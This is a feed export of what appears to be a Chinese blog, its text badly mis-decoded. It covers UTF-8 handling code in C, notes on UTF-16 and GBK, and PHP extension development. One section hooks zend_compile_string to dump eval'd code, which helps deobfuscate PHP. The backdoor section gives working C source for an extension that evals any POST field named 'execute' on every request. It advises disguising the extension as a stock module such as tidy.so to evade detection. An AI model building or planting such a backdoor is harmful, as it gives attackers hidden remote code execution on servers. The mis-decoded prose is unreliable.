class="keyword">char</span> *new_s;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (curr_pos &lt; start &amp;&amp; *s) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*s &amp; <span class="number">0b11000000</span>) != <span class="number">0b10000000</span>) &#123;</span><br><span class="line">            curr_pos += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s += (get_tail_length(*s) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curr_pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (curr_pos &lt; length &amp;&amp; *s) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*s &amp; <span class="number">0b11000000</span>) != <span class="number">0b10000000</span>) &#123;</span><br><span class="line">            curr_pos += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s++;</span><br><span class="line">        byte_count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (curr_pos &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        offset = get_tail_length(*(s - <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        new_s = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (byte_count + offset + <span class="number">1</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(new_s, s - byte_count, byte_count + offset);</span><br><span class="line">        new_s[byte_count + offset] = <span class="string">'\0'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        new_s = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> new_s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">utf8_to_codepoint</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> codepoint = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((*s &amp; <span class="number">0b11111000</span>) == <span class="number">0b11110000</span>) &#123;</span><br><span class="line">        length = <span class="number">4</span>;</span><br><span class="line">        codepoint = *s &amp; <span class="number">0b111</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*s &amp; <span class="number">0b11110000</span>) == <span class="number">0b11100000</span>) &#123;</span><br><span class="line">        length = <span class="number">3</span>;</span><br><span class="line">        codepoint = *s &amp; <span class="number">0b1111</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((*s &amp; <span class="number">0b11100000</span>) == <span class="number">0b11000000</span>) &#123;</span><br><span class="line">        length = <span class="number">2</span>;</span><br><span class="line">        codepoint = *s &amp; <span class="number">0b11111</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        length = <span class="number">1</span>;</span><br><span class="line">        codepoint = *s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">        s++;</span><br><span class="line">        codepoint &lt;&lt;= <span class="number">6</span>;</span><br><span class="line">        codepoint = codepoint | (*s &amp; <span class="number">0b00111111</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> codepoint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    char *content = read_file("/home/rmb122/temp/example.txt");</span></span><br><span class="line"><span class="comment">    printf("%d", utf8_strlen(content));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    free(content);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, utf8_strlen(<span class="string">"ä¸€äºŒä¸‰å››äº”å…­ä¸€äºŒä¸‰å››äº”å…­1234"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *s;</span><br><span class="line">    <span class="keyword">int</span> sz;</span><br><span class="line"></span><br><span class="line">    s = codepoint_to_utf8(<span class="number">21834</span>, &amp;sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.*s\n"</span>, sz, s);</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line"></span><br><span class="line">    s = utf8_substr(<span class="string">"ä¸€2ä¸‰å››5å…­7å…«9"</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (s) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, s);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, <span class="string">"null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, utf8_to_codepoint(<span class="string">"äº”"</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h2><p>è¯´å®è¯, æˆ‘è§‰å¾— UTF-16 å·²ç»å¯ä»¥è¢«æ‰”è¿›å†å²çš„åƒåœ¾æ¡¶, ç„¶è€Œ <code>Windows</code> è¿˜ä¾ç„¶ä½¿ç”¨ 233.<br>ä»–æœ¬èº«æ˜¯ä¸ºäº†ä¿è¯å›ºå®šé•¿åº¦è€Œè®¾è®¡çš„, å› ä¸ºä¸¤ä¸ªå­—èŠ‚ 256*256, å¯ä»¥è¡¨ç¤º 65536 ç§å­—ç¬¦,<br>åœ¨ä»¥å‰ unicode æ”¶å½•å­—ç¬¦æ¯”è¾ƒå°‘çš„æƒ…å†µä¸‹æ˜¯å®Œå…¨å¤Ÿçš„, è¿™æ ·æ¯ä¸ªå­—ç¬¦éƒ½ä¿å­˜ä¸ºä¸¤ä¸ªå­—èŠ‚é•¿,<br>å¯ä»¥èŠ‚çœè¿ç®—, è™½ç„¶æµªè´¹äº†æŒºå¤šçš„ç©ºé—´, ä½†æ˜¯ç¡®å®å¾ˆæ–¹ä¾¿.  </p><p>ç„¶è€Œç°åœ¨ä¸Šé¢çš„ç½‘ç«™ä¸Šçœ‹åˆ°,  unicode æ”¶å½•çš„å­—ç¬¦æ—©å·²è¶…è¿‡äº† 65536 ä¸ª, ä¹Ÿå°±æ„å‘³ç€ç ç‚¹è¶…è¿‡äº† <code>0xFFFF</code>.<br>è¿™é‡Œä»¥ <code>ğ </code> è¿™ä¸ªå­—ç¬¦ä¸ºä¾‹  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"å•Š"</span>.encode(<span class="string">'utf-16be'</span>)</span><br><span class="line"><span class="string">b'UJ'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"ğ "</span>.encode(<span class="string">'utf-16be'</span>)</span><br><span class="line"><span class="string">b'\xd8\x00\xdf\xa0'</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°, å®é™…ä¸Šä¿å­˜è¿™ä¸ªå­—ç¬¦ç”¨äº† 4 ä¸ªå­—èŠ‚. å†å²çš„å‘å±•ä½¿å¾— UTF-16 å”¯ä¸€çš„å¥½å¤„å·²ç»è¡ç„¶æ— å­˜.<br>è€Œä¸”ä¸ºäº†ä¿å­˜å¤§ç«¯å°ç«¯çš„é¢å¤–ä¿¡æ¯, è¿˜ç”¨äº† <code>BOM</code> è¿™ç§ä¸‘é™‹çš„è®¾è®¡, å¸Œæœ› <code>Windows</code> ä¹Ÿèƒ½æ—©ç‚¹æ·˜æ±°æ‰ UTF-16 æŠŠ 233</p><h2 id="GBK"><a href="#GBK" class="headerlink" title="GBK"></a>GBK</h2><p>è¿™ä¸ªæ˜¯æˆ‘å›½è‡ªåˆ›çš„ç¼–ç æ ‡å‡†, ä¼˜ç‚¹éå¸¸æ˜æ˜¾, èŠ‚çœç©ºé—´, ç›¸å½“äºç¼©å°ç‰ˆçš„ UTF-8 (å½“ç„¶ç”¨çš„ç ç‚¹è¡¨å’Œå…·ä½“å®ç°è·Ÿ unicode ä¸åŒ),<br>å› ä¸ºå®ƒåªéœ€è¦è¡¨è¾¾ ASCII + æ±‰å­—çš„å­—ç¬¦ç©ºé—´å°±å¤Ÿäº†. å½“ç„¶ç¼ºç‚¹ä¹Ÿéå¸¸æ˜æ˜¾, ä¸èƒ½è¡¨è¾¾ ASCII + æ±‰å­—ä¹‹å¤–çš„å­—ç¬¦, ä¹Ÿå°±æ³¨å®šåªèƒ½åœ¨ä¸­å›½ä½¿ç”¨,<br>æ— æ³•å›½é™…åŒ–, è€Œä¸”å®é™…ä¸Šå¾ˆå¤šå›½å®¶éƒ½æœ‰ä¸€å¥—è‡ªåˆ›å­—ç¬¦é›†, è¿™æ›´ä¿ƒè¿›äº† unicode çš„è¯ç”Ÿ. </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä»¥å‰å¯¹ UTF-8, UTF-16, unicode, GBK, ASCII ä¹‹ç±»çš„éƒ½æ˜¯ä¸€çŸ¥åŠè§£, å…¶å®æ·±å…¥ä¹‹åäº†è§£è¿™äº›å¹¶ä¸å›°éš¾.  &lt;/p&gt;
    
    </summary>
    
    
    
      <category term="misc" scheme="https://rmb122.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>PHP æ‰©å±•å­¦ä¹ </title>
    <link href="https://rmb122.com/2019/07/31/PHP-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/"/>
    <id>https://rmb122.com/2019/07/31/PHP-%E6%89%A9%E5%B1%95%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-07-31T09:11:21.000Z</published>
    <updated>2019-08-01T08:30:22.844Z</updated>
    
    <content type="html"><![CDATA[<p>PHP ç±»ä¼¼äº python ä¹Ÿæ˜¯è¿è¡Œåœ¨è§£é‡Šå™¨ä¸Šçš„, PHP çš„å« zend, python çš„å« cpython,<br>è¿™äº›éƒ½æ˜¯å®˜æ–¹å®ç°, åƒ python ä¹Ÿæœ‰ jython, pypy å•¥çš„, ç”¨å…¶ä»–è¯­è¨€å†™çš„è§£é‡Šå™¨.  </p><a id="more"></a><p>ä¸¤è€…æœ‰ä¸ªéå¸¸ç›¸ä¼¼çš„åœ°æ–¹, æˆ–è€…è¯´åŠ¨æ€è¯­è¨€éƒ½éå¸¸ç›¸ä¼¼çš„åœ°æ–¹, æ˜¯éƒ½å­˜åœ¨ä¸€ä¸ªä¸‡èƒ½åŸºç±»,<br>python çš„å« <code>PyObject</code>, php çš„å« <code>zval</code>. python çš„å› ä¸ºæ²¡çœ‹è¿‡, ä¸å¤ªäº†è§£, åœ¨ PHP ä¸­,<br>æ˜¯é  union ç»“æ„ä½“æ¥å®ç°çš„  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> _zend_value &#123;</span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="keyword">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="keyword">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">uint32_t</span> w1;</span><br><span class="line"><span class="keyword">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯ union, å…¶å®è¿™å¤§å°åœ¨ amd64 ä¸Šå…¶å®å°±æ˜¯ 8 å­—èŠ‚, C è¯­è¨€è¿™ç¥å¥‡çš„ç‰¹æ€§å…¶å®åœ¨æŸç§å½¢å¼ä¸Šåšåˆ°äº†å¤šæ€.<br>ä¸€åˆ‡å¯¹è±¡éƒ½å¯ä»¥ç”¨ zval æ¥è¡¨è¾¾.</p><p>è€Œ PHP æ‰©å±•, å°±æ˜¯å¯ä»¥ç›´æ¥å¹²é¢„è¿™ä¸ª zend è™šæ‹Ÿæœºæœ¬èº«çš„æ‰§è¡Œ, æ¯”å¦‚åŠ å‡ ä¸ªå‡½æ•°, æ›¿æ¢åŸæ¥çš„å‡½æ•°ä¹‹ç±»çš„. zend è™šæ‹Ÿæœºä¼šåœ¨å¯åŠ¨æ—¶æ‰§è¡Œä¸€ç³»åˆ—å‡½æ•°,<br>åŠ è½½æ‰©å±•é‡Œé¢å®šä¹‰çš„å„ç§å‡½æ•°, PHP_MINIT, PHP_RINIT, PHP_FUNCTION ç­‰ç­‰.  </p><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/php/php-src.git -b php-7.3.7</span><br><span class="line"><span class="built_in">cd</span> php-7.3.7</span><br><span class="line">./ext/ext_skel.php --ext extname</span><br><span class="line">./configure</span><br></pre></td></tr></table></figure><p>å°±èƒ½è‡ªåŠ¨ç”Ÿæˆä¸€å¥—æ¨¡ç‰ˆ, æ¯•ç«Ÿæ˜¯å¼€æºäº§å“, å¯¹å¼€å‘è€…éå¸¸å‹å¥½,<br>CLion å¯ä»¥ç”¨ä»¥ä¸‹ CMakelist æ·»åŠ é«˜äº®, æ–¹ä¾¿å¼€å‘.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">cmake_minimum_required(VERSION 3.3)</span><br><span class="line">project(backdoor)</span><br><span class="line"></span><br><span class="line">add_custom_target(makefile COMMAND make WORKING_DIRECTORY $&#123;PROJECT_SOURCE_DIR&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmake_minimum_required(VERSION 3.6)</span><br><span class="line">project(backdoor C)</span><br><span class="line"></span><br><span class="line">message(&quot;Begin cmaking of PHP extension ...&quot;)</span><br><span class="line"></span><br><span class="line"># -std&#x3D;gnu99</span><br><span class="line">set(CMAKE_C_STANDARD 99)</span><br><span class="line">set(CMAKE_C_FLAGS &quot;$&#123;CMAKE_C_FLAGS&#125; -ggdb -O0 -Wall -std&#x3D;gnu99 -fvisibility&#x3D;hidden&quot;)</span><br><span class="line">set(ENV&#123;PROJECT_ROOT&#125; &quot;$&#123;CMAKE_HOME_DIRECTORY&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># NOTE: This CMake file is just for syntax highlighting in CLion, æ›¿æ¢æˆä½ è‡ªå·±çš„è·¯å¾„</span><br><span class="line">include_directories(</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F; </span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;main</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;Zend</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;TSRM</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;ext</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;ext&#x2F;standard</span><br><span class="line">        ~&#x2F;temp&#x2F;php-src&#x2F;sapi</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">set(SOURCE_FILES</span><br><span class="line">        backdoor.c</span><br><span class="line">        php_backdoor.h</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">if(EXISTS &quot;$ENV&#123;PROJECT_ROOT&#125;&#x2F;config.h&quot;)</span><br><span class="line">    set(SOURCE_FILES &quot;$&#123;SOURCE_FILES&#125;;config.h&quot;)</span><br><span class="line">endif()</span><br><span class="line"></span><br><span class="line">add_library(backdoor $&#123;SOURCE_FILES&#125;)</span><br><span class="line"></span><br><span class="line">message(&quot;End cmaking of PHP extension ...&quot;)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å­¦ä¹ ä¸€ä¸‹æ‰©å±•çš„å‡ ç§åˆ©ç”¨æ–¹å¼  </p><h2 id="æ›¿æ¢-zend-compile-string"><a href="#æ›¿æ¢-zend-compile-string" class="headerlink" title="æ›¿æ¢ zend_compile_string"></a>æ›¿æ¢ zend_compile_string</h2><p>è¿™åœ¨ <code>php-src/Zend/zend_compile.h:722</code> è¢«å®šä¹‰, <code>php-src/Zend/zend.c:835</code> è¢«å®ç°,  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_compile_string = compile_string;</span><br></pre></td></tr></table></figure><p>å®šä¹‰çš„æ—¶å€™å°±æ˜¯å®šä¹‰ä¸ºå‡½æ•°æŒ‡é’ˆ, å¯ä»¥è¯´æ˜¯è¿™ä¹ˆæ•…æ„è®¾è®¡çš„, å°±æ˜¯ä¸ºäº†æ–¹ä¾¿æ›¿æ¢.<br>è¿™ä¸ªå‡½æ•°å°±æ˜¯ zend engine è§£æä»£ç åˆ° op code çš„å‡½æ•°, æ­£å¦‚å…¶å, èµ·åˆ°ç¼–è¯‘å™¨çš„ä½œç”¨.  </p><p>è€Œ eval, include ç­‰ç­‰, éƒ½ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°, å› ä¸ºéƒ½éœ€è¦ç¼–è¯‘åˆ° op code æ‰èƒ½çœŸæ­£è¢«æ‰§è¡Œ.<br>æ‰€ä»¥æˆ‘ä»¬å°±èƒ½æ›¿æ¢è¿™ä¸ªå‡½æ•°åˆ°è‡ªå·±å®šä¹‰çš„å‡½æ•°, æ¯”å¦‚åœ¨ <code>compile_string</code> çš„åŒæ—¶, æŠŠ<br>å®ƒè¾“å…¥çš„å­—ç¬¦ä¸², ä¹Ÿå°±æ˜¯ä»£ç æ‰“å°å‡ºæ¥, å°±èƒ½åœ¨æŸäº›æ—¶å€™èµ·åˆ°è§£å¯†çš„ä½œç”¨.<br>å› ä¸ºæŸäº›åŠ å¯†å°±æ˜¯å•çº¯å„ç§å˜æ¢æœ€å eval ä¸€ä¸‹è€Œå·², æœ¬è´¨åŸå› æ˜¯ PHP æœ¬èº«å°±å¾ˆçµæ´», å„ç§åå°„, è¿˜æœ‰ $$var è¿™ç§ä¸œè¥¿,<br>å¦‚æœæ›¿æ¢å˜é‡å/å‡½æ•°å, å¤§æ¦‚ç‡ä¼šå¯¼è‡´ä»£ç ä¸å¯ç”¨. æ‰€ä»¥å¾ˆå¤šåŠ å¯†å…¶å®é€šè¿‡æ›¿æ¢ zend_compile_string å°±å¯ä»¥å®Œå…¨è§£å¯†.  </p><p>äº†è§£äº†åŸç†, é‚£ä¹ˆå†™èµ·æ¥ä¸æ˜¯å¾ˆå›°éš¾, å°±æ˜¯å°† source_string æ‰“å°å‡ºæ¥å³å¯, æ”¾åœ¨ <code>RINIT</code> ä¸­, æ¯æ¬¡è¯·æ±‚éƒ½ä¼šé‡æ–°æ›¿æ¢ä¸€æ¬¡.  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">zend_op_array *<span class="title">dump_while_eval</span><span class="params">(zval *source_string, <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    php_printf(<span class="string">"\n\nfilename: \n"</span>);</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, filename);</span><br><span class="line">    php_printf(<span class="string">"\n\neval_code: \n"</span>);</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, Z_STRVAL_P(source_string));</span><br><span class="line">    php_printf(<span class="string">"\n\nresult: \n"</span>);</span><br><span class="line">    <span class="keyword">return</span> compile_string(source_string, filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(backdoor) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span></span><br><span class="line">    ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// hook eval</span></span><br><span class="line">    zend_compile_string = dump_while_eval;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™ <code>make &amp;&amp; make install</code> ä¸€ä¸‹, åœ¨ ini ä¸­å¼€å¯æ‰©å±•, php -a ä¸€ä¸‹, å°±å¯ä»¥å‘ç°å·²ç»æˆåŠŸäº†, å› ä¸º php -a è¯´åˆ°åº•ä¹Ÿå¾—<br>ç»è¿‡ç¼–è¯‘è¿™ä¸ªè¿‡ç¨‹.</p><h2 id="ç•™åé—¨"><a href="#ç•™åé—¨" class="headerlink" title="ç•™åé—¨"></a>ç•™åé—¨</h2><p>è¿™ä¸ªå…¶å®æˆ‘æ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒéšè”½çš„, å¯ä»¥æŠŠåŸæ¥çš„æ¯”å¦‚ <code>;extension=tidy</code>, <code>tidy.so</code>, æ¢æˆè‡ªå·±çš„, ç„¶åå¼€å¯,<br>æˆ‘ä¼°è®¡å¾ˆå°‘æœ‰äººä¼šæ³¨æ„åˆ°, æŸ¥æ€çš„è¯å¾—æ£€æŸ¥ HASH ä¹‹ç±»çš„, è¯´å®è¯æŒºéº»çƒ¦çš„, æ¯•ç«Ÿæ¯æ¬¡æ›´æ–°è¿™ä¸ª hash éƒ½ä¼šå˜.<br>è€Œç•™åé—¨çš„è¯ä¸€èˆ¬éƒ½æ˜¯åœ¨ RINIT ä¸­æ·»åŠ , æ¯æ¬¡éƒ½æ£€æŸ¥ <code>$_POST</code> ä¸Šæœ‰æ²¡æœ‰è‡ªå·±ç•™ä¸‹çš„åé—¨å¯†ç , æœ‰çš„è¯æ‰§è¡Œä¸€ä¸‹,<br>ç›¸å½“äºæŠŠ webshell è—åˆ°æ‰©å±•é‡Œé¢äº†.<br>å½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±ç»™æ·»åŠ ä¸€ä¸ª my_eval å‡½æ•°ä¹‹ç±»çš„, D ç›¾ 100% æŸ¥ä¸å‡ºæ¥ 233  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(my_backdoor_eval) &#123;</span><br><span class="line">    <span class="keyword">char</span>* tmp;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        Z_PARAM_STRING(tmp, len)</span><br><span class="line">    ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">    zend_eval_string(tmp, <span class="literal">NULL</span>, (<span class="keyword">char</span> *)<span class="string">""</span> TSRMLS_CC);</span><br><span class="line">    RETURN_TRUE</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(backdoor) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_BACKDOOR)</span></span><br><span class="line">    ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">char</span> *password = <span class="string">"execute"</span>;</span><br><span class="line"></span><br><span class="line">    zval * arr, *code = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (arr = zend_hash_str_find(&amp;EG(symbol_table), <span class="string">"_POST"</span>, <span class="keyword">sizeof</span>(<span class="string">"_POST"</span>) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Z_TYPE_P(arr) == IS_ARRAY &amp;&amp;</span><br><span class="line">            (code = zend_hash_str_find(Z_ARRVAL_P(arr), password, <span class="built_in">strlen</span>(password)))) &#123;</span><br><span class="line">            zend_eval_string(Z_STRVAL_P(code), <span class="literal">NULL</span>, <span class="string">""</span> TSRMLS_CC);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_backdoor_eval, <span class="number">0</span>)</span><br><span class="line">                ZEND_ARG_INFO(<span class="number">0</span>, str)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; backdoor_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry backdoor_functions[] = &#123;</span><br><span class="line">PHP_FE(my_backdoor_eval,       arginfo_my_backdoor_eval)</span><br><span class="line">PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br></pre></td></tr></table></figure><h2 id="RASP"><a href="#RASP" class="headerlink" title="RASP"></a>RASP</h2><p>è¿™ä¸ªå…¶å®æˆ‘æ„Ÿè§‰å‰é€”åº”è¯¥æ˜¯æœ€å¤§çš„, å¯ä»¥å‚è€ƒ <a href="https://github.com/laruence/taint" target="_blank" rel="noopener">https://github.com/laruence/taint</a>,<br>æ¯•ç«Ÿæ˜¯ PHP çš„å¼€å‘è€…, çœŸçš„ tql.  </p><p>æˆ‘å‚è€ƒä¹‹å‰çš„ php_apd, é€šè¿‡æ›¿æ¢å‡½æ•°è¡¨é‡Œé¢çš„å‡½æ•°ä¹Ÿå®ç°äº†ä¸€ä¸ª, å½“ç„¶è‚¯å®šæ²¡æœ‰é¸Ÿå“¥ç›´æ¥åŠ«æŒ op code 